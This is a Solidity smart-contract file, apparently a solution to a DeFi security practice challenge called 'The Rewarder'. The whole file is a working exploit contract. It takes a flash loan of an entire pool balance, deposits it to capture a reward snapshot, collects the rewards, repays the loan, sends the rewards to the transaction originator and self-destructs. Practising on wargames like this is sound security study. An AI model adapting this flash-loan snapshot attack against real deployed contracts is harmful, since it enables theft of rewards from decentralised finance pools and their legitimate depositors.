/// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function liquidityToken() external view returns (address);

    function rewardToken() external view returns (address);

    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;

    function distributeRewards() external returns (uint256);

    function isNewRewardsRound() external view returns (bool);
}

contract TheRewarderAttack {
    ITheRewarderPool private immutable pool;

    constructor(address poolAddress) {
        pool = ITheRewarderPool(poolAddress);
    }

    function attack(address loanProviderAddress) external {
        require(pool.isNewRewardsRound(), "the snapshot is already taken"); // no need to waist more gas
        uint256 amount = IERC20(pool.liquidityToken()).balanceOf(
            loanProviderAddress
        );
        IFlashLoanerPool(loanProviderAddress).flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        address attacker = tx.origin;
        address loanProvider = msg.sender;
        IERC20 liquidityToken = IERC20(pool.liquidityToken());
        IERC20 rewardToken = IERC20(pool.rewardToken());

        liquidityToken.approve(address(pool), amount); // will allow the pool to take custody of the loan in deposit

        pool.deposit(amount);
        pool.distributeRewards();
        pool.withdraw(amount);

        liquidityToken.transfer(loanProvider, amount); // pay back the flash loan
        uint256 rewards = rewardToken.balanceOf(address(this));
        rewardToken.transfer(attacker, rewards); // send the rewards to the attacker

        selfdestruct(payable(attacker));
    }
}
